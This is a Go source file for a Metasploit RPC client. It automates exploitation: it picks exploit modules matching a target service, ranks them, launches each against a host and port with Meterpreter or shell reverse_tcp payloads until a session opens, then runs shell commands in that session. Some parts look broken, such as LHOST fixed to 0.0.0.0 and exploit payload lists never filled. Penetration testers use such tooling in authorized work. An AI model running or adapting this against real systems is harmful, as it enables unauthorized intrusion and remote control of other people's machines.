package msf

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

type MSFClient struct {
	rpcURL      string
	client      *http.Client
	consoleID   string
	sessions    map[string]*Session
	exploits    []*ExploitModule
	payloads    []*PayloadModule
	mutex       sync.RWMutex
	logger      *logrus.Logger
	authToken   string
	connected   bool
}

type Session struct {
	ID          string            `json:"id"`
	Type        string            `json:"type"`
	TunnelLocal string            `json:"tunnel_local"`
	TunnelPeer  string            `json:"tunnel_peer"`
	ViaExploit  string            `json:"via_exploit"`
	ViaPayload  string            `json:"via_payload"`
	Description string            `json:"desc"`
	Info        string            `json:"info"`
	Workspace   string            `json:"workspace"`
	SessionHost string            `json:"session_host"`
	SessionPort int               `json:"session_port"`
	TargetHost  string            `json:"target_host"`
	Username    string            `json:"username"`
	UUID        string            `json:"uuid"`
	ExploitUUID string            `json:"exploit_uuid"`
	Routes      []string          `json:"routes"`
	Platform    string            `json:"platform"`
	CreatedAt   time.Time         `json:"created_at"`
	LastSeen    time.Time         `json:"last_seen"`
}

type ExploitModule struct {
	Name        string            `json:"name"`
	FullName    string            `json:"fullname"`
	Disclosure  string            `json:"disclosure_date"`
	Rank        string            `json:"rank"`
	Type        string            `json:"type"`
	Description string            `json:"description"`
	Author      []string          `json:"author"`
	References  []Reference       `json:"references"`
	Targets     []Target          `json:"targets"`
	Platform    []string          `json:"platform"`
	Arch        []string          `json:"arch"`
	Options     map[string]Option `json:"options"`
	Payloads    []string          `json:"payloads"`
	Privileged  bool              `json:"privileged"`
	Rating      int               `json:"rating"`
}

type PayloadModule struct {
	Name        string            `json:"name"`
	FullName    string            `json:"fullname"`
	Description string            `json:"description"`
	Author      []string          `json:"author"`
	Platform    []string          `json:"platform"`
	Arch        []string          `json:"arch"`
	Options     map[string]Option `json:"options"`
	Size        int               `json:"size"`
	Handler     string            `json:"handler"`
	Stage       bool              `json:"stage"`
	Stager      bool              `json:"stager"`
}

type Reference struct {
	Type string `json:"type"`
	Ref  string `json:"ref"`
}

type Target struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
}

type Option struct {
	Type        string      `json:"type"`
	Description string      `json:"desc"`
	Required    bool        `json:"required"`
	Advanced    bool        `json:"advanced"`
	Evasion     bool        `json:"evasion"`
	Default     interface{} `json:"default"`
	Enums       []string    `json:"enums"`
}

type ExploitResult struct {
	Success      bool              `json:"success"`
	SessionID    string            `json:"session_id"`
	Output       string            `json:"output"`
	Error        string            `json:"error"`
	ExploitUsed  string            `json:"exploit_used"`
	PayloadUsed  string            `json:"payload_used"`
	TargetHost   string            `json:"target_host"`
	TargetPort   int               `json:"target_port"`
	Duration     time.Duration     `json:"duration"`
	Timestamp    time.Time         `json:"timestamp"`
	Credentials  map[string]string `json:"credentials"`
	Privileges   string            `json:"privileges"`
	OS           string            `json:"os"`
	Architecture string            `json:"architecture"`
}

type RPCRequest struct {
	Method string        `json:"method"`
	Token  string        `json:"token,omitempty"`
	Params []interface{} `json:"params"`
}

type RPCResponse struct {
	Result interface{} `json:"result"`
	Error  *RPCError   `json:"error"`
}

type RPCError struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

func NewMSFClient(rpcURL string) *MSFClient {
	return &MSFClient{
		rpcURL:   rpcURL,
		client:   &http.Client{Timeout: time.Second * 30},
		sessions: make(map[string]*Session),
		exploits: make([]*ExploitModule, 0),
		payloads: make([]*PayloadModule, 0),
		logger:   logrus.New(),
	}
}

func (msf *MSFClient) Connect(username, password string) error {
	req := &RPCRequest{
		Method: "auth.login",
		Params: []interface{}{username, password},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return err
	}

	if result, ok := resp.Result.(map[string]interface{}); ok {
		if token, exists := result["token"]; exists {
			msf.authToken = token.(string)
			msf.connected = true
			return msf.createConsole()
		}
	}

	return fmt.Errorf("authentication failed")
}

func (msf *MSFClient) createConsole() error {
	req := &RPCRequest{
		Method: "console.create",
		Token:  msf.authToken,
		Params: []interface{}{},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return err
	}

	if result, ok := resp.Result.(map[string]interface{}); ok {
		if id, exists := result["id"]; exists {
			msf.consoleID = fmt.Sprintf("%v", id)
			return nil
		}
	}

	return fmt.Errorf("failed to create console")
}

func (msf *MSFClient) makeRequest(req *RPCRequest) (*RPCResponse, error) {
	data, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	httpReq, err := http.NewRequest("POST", msf.rpcURL, bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}

	httpReq.Header.Set("Content-Type", "application/json")

	httpResp, err := msf.client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer httpResp.Body.Close()

	body, err := io.ReadAll(httpResp.Body)
	if err != nil {
		return nil, err
	}

	var resp RPCResponse
	err = json.Unmarshal(body, &resp)
	if err != nil {
		return nil, err
	}

	if resp.Error != nil {
		return nil, fmt.Errorf("RPC error: %s", resp.Error.Message)
	}

	return &resp, nil
}

func (msf *MSFClient) LoadExploits() error {
	req := &RPCRequest{
		Method: "module.exploits",
		Token:  msf.authToken,
		Params: []interface{}{},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return err
	}

	if result, ok := resp.Result.(map[string]interface{}); ok {
		if modules, exists := result["modules"]; exists {
			if moduleList, ok := modules.([]interface{}); ok {
				for _, module := range moduleList {
					if moduleName, ok := module.(string); ok {
						exploit, err := msf.getExploitInfo(moduleName)
						if err == nil {
							msf.exploits = append(msf.exploits, exploit)
						}
					}
				}
			}
		}
	}

	return nil
}

func (msf *MSFClient) getExploitInfo(moduleName string) (*ExploitModule, error) {
	req := &RPCRequest{
		Method: "module.info",
		Token:  msf.authToken,
		Params: []interface{}{"exploit", moduleName},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return nil, err
	}

	exploit := &ExploitModule{}
	if result, ok := resp.Result.(map[string]interface{}); ok {
		exploit.Name = moduleName
		if name, exists := result["name"]; exists {
			exploit.FullName = name.(string)
		}
		if desc, exists := result["description"]; exists {
			exploit.Description = desc.(string)
		}
		if rank, exists := result["rank"]; exists {
			exploit.Rank = rank.(string)
		}
		if disclosure, exists := result["disclosure_date"]; exists {
			exploit.Disclosure = disclosure.(string)
		}
	}

	return exploit, nil
}

func (msf *MSFClient) FindExploitsForService(serviceName, version string) []*ExploitModule {
	var matches []*ExploitModule

	for _, exploit := range msf.exploits {
		if msf.matchesService(exploit, serviceName, version) {
			matches = append(matches, exploit)
		}
	}

	return msf.sortExploitsByRank(matches)
}

func (msf *MSFClient) matchesService(exploit *ExploitModule, serviceName, version string) bool {
	serviceLower := strings.ToLower(serviceName)
	versionLower := strings.ToLower(version)
	exploitName := strings.ToLower(exploit.Name)
	exploitDesc := strings.ToLower(exploit.Description)

	if strings.Contains(exploitName, serviceLower) || strings.Contains(exploitDesc, serviceLower) {
		if version == "" || strings.Contains(exploitDesc, versionLower) {
			return true
		}
	}

	return false
}

func (msf *MSFClient) sortExploitsByRank(exploits []*ExploitModule) []*ExploitModule {
	rankOrder := map[string]int{
		"excellent": 5,
		"great":     4,
		"good":      3,
		"normal":    2,
		"average":   1,
		"low":       0,
	}

	for i := 0; i < len(exploits)-1; i++ {
		for j := i + 1; j < len(exploits); j++ {
			rankA := rankOrder[strings.ToLower(exploits[i].Rank)]
			rankB := rankOrder[strings.ToLower(exploits[j].Rank)]
			if rankA < rankB {
				exploits[i], exploits[j] = exploits[j], exploits[i]
			}
		}
	}

	return exploits
}

func (msf *MSFClient) AutoExploit(target string, port int, serviceName, version string) *ExploitResult {
	exploits := msf.FindExploitsForService(serviceName, version)

	for _, exploit := range exploits {
		result := msf.TryExploit(target, port, exploit)
		if result.Success {
			return result
		}
		time.Sleep(time.Second * 2)
	}

	return &ExploitResult{
		Success:    false,
		Error:      "No successful exploits",
		TargetHost: target,
		TargetPort: port,
		Timestamp:  time.Now(),
	}
}

func (msf *MSFClient) TryExploit(target string, port int, exploit *ExploitModule) *ExploitResult {
	start := time.Now()
	result := &ExploitResult{
		ExploitUsed: exploit.Name,
		TargetHost:  target,
		TargetPort:  port,
		Timestamp:   start,
	}

	payload := msf.selectBestPayload(exploit)
	if payload == "" {
		result.Error = "No suitable payload found"
		return result
	}

	result.PayloadUsed = payload

	commands := []string{
		fmt.Sprintf("use %s", exploit.Name),
		fmt.Sprintf("set RHOSTS %s", target),
		fmt.Sprintf("set RPORT %d", port),
		fmt.Sprintf("set PAYLOAD %s", payload),
		fmt.Sprintf("set LHOST %s", msf.getLocalHost()),
		fmt.Sprintf("set LPORT %d", msf.getRandomPort()),
		"exploit",
	}

	for _, cmd := range commands {
		output, err := msf.executeCommand(cmd)
		if err != nil {
			result.Error = err.Error()
			return result
		}
		result.Output += output + "\n"
	}

	time.Sleep(time.Second * 5)

	sessions := msf.GetActiveSessions()
	if len(sessions) > 0 {
		latestSession := sessions[len(sessions)-1]
		result.Success = true
		result.SessionID = latestSession.ID
		result.OS = latestSession.Platform
		result.Duration = time.Since(start)
	}

	return result
}

func (msf *MSFClient) selectBestPayload(exploit *ExploitModule) string {
	preferredPayloads := []string{
		"windows/x64/meterpreter/reverse_tcp",
		"windows/meterpreter/reverse_tcp",
		"linux/x64/meterpreter/reverse_tcp",
		"linux/x86/meterpreter/reverse_tcp",
		"generic/shell_reverse_tcp",
	}

	for _, preferred := range preferredPayloads {
		for _, available := range exploit.Payloads {
			if strings.Contains(available, preferred) {
				return available
			}
		}
	}

	if len(exploit.Payloads) > 0 {
		return exploit.Payloads[0]
	}

	return ""
}

func (msf *MSFClient) executeCommand(command string) (string, error) {
	req := &RPCRequest{
		Method: "console.write",
		Token:  msf.authToken,
		Params: []interface{}{msf.consoleID, command + "\n"},
	}

	_, err := msf.makeRequest(req)
	if err != nil {
		return "", err
	}

	time.Sleep(time.Millisecond * 500)

	return msf.readConsoleOutput()
}

func (msf *MSFClient) readConsoleOutput() (string, error) {
	req := &RPCRequest{
		Method: "console.read",
		Token:  msf.authToken,
		Params: []interface{}{msf.consoleID},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return "", err
	}

	if result, ok := resp.Result.(map[string]interface{}); ok {
		if data, exists := result["data"]; exists {
			return data.(string), nil
		}
	}

	return "", nil
}

func (msf *MSFClient) GetActiveSessions() []*Session {
	req := &RPCRequest{
		Method: "session.list",
		Token:  msf.authToken,
		Params: []interface{}{},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return nil
	}

	var sessions []*Session
	if result, ok := resp.Result.(map[string]interface{}); ok {
		for id, sessionData := range result {
			if sessionMap, ok := sessionData.(map[string]interface{}); ok {
				session := &Session{ID: id}
				if stype, exists := sessionMap["type"]; exists {
					session.Type = stype.(string)
				}
				if desc, exists := sessionMap["desc"]; exists {
					session.Description = desc.(string)
				}
				if info, exists := sessionMap["info"]; exists {
					session.Info = info.(string)
				}
				if platform, exists := sessionMap["platform"]; exists {
					session.Platform = platform.(string)
				}
				sessions = append(sessions, session)
			}
		}
	}

	return sessions
}

func (msf *MSFClient) ExecuteSessionCommand(sessionID, command string) (string, error) {
	req := &RPCRequest{
		Method: "session.shell_write",
		Token:  msf.authToken,
		Params: []interface{}{sessionID, command + "\n"},
	}

	_, err := msf.makeRequest(req)
	if err != nil {
		return "", err
	}

	time.Sleep(time.Second * 2)

	req = &RPCRequest{
		Method: "session.shell_read",
		Token:  msf.authToken,
		Params: []interface{}{sessionID},
	}

	resp, err := msf.makeRequest(req)
	if err != nil {
		return "", err
	}

	if result, ok := resp.Result.(map[string]interface{}); ok {
		if data, exists := result["data"]; exists {
			return data.(string), nil
		}
	}

	return "", nil
}

func (msf *MSFClient) getLocalHost() string {
	return "0.0.0.0"
}

func (msf *MSFClient) getRandomPort() int {
	return 4444 + (int(time.Now().Unix()) % 1000)
}

func (msf *MSFClient) Disconnect() error {
	if msf.consoleID != "" {
		req := &RPCRequest{
			Method: "console.destroy",
			Token:  msf.authToken,
			Params: []interface{}{msf.consoleID},
		}
		msf.makeRequest(req)
	}

	req := &RPCRequest{
		Method: "auth.logout",
		Token:  msf.authToken,
		Params: []interface{}{msf.authToken},
	}

	_, err := msf.makeRequest(req)
	msf.connected = false
	return err
}

func (msf *MSFClient) IsConnected() bool {
	return msf.connected
}

func (msf *MSFClient) GetExploitCount() int {
	return len(msf.exploits)
}

func (msf *MSFClient) GetSessionCount() int {
	msf.mutex.RLock()
	defer msf.mutex.RUnlock()
	return len(msf.sessions)
}